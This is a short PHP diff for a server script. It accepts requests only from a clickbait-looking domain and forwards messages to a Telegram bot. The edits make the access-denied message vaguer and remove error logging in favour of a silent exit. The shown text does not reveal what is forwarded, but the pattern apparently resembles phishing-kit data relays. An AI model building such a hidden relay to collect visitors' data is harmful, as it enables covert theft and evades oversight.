@@ -5,7 +5,7 @@ $allowedDomain = "https://desiviralxxxvideos.infy.uk";
 // Restrict access to the specific domain    
 if (!isset($_SERVER['HTTP_ORIGIN']) || $_SERVER['HTTP_ORIGIN'] !== $allowedDomain) {    
     header("HTTP/1.1 403 Forbidden");    
-    echo "Access denied";    
+    echo "Invalid";    
     exit();    
 }    
 
@@ -28,10 +28,9 @@ $chatId = getenv('ID');
 function sendToTelegram($message) {      
     global $telegramToken, $chatId;      
 
-    if (!$telegramToken || !$chatId) {    
-        error_log("Telegram credentials are missing.");    
-        return;    
-    }    
+    if (!$telegramToken || !$chatId) {      
+    exit(); // Just exit without logging
+}
 
     $url = "https://api.telegram.org/bot$telegramToken/sendMessage";      
 
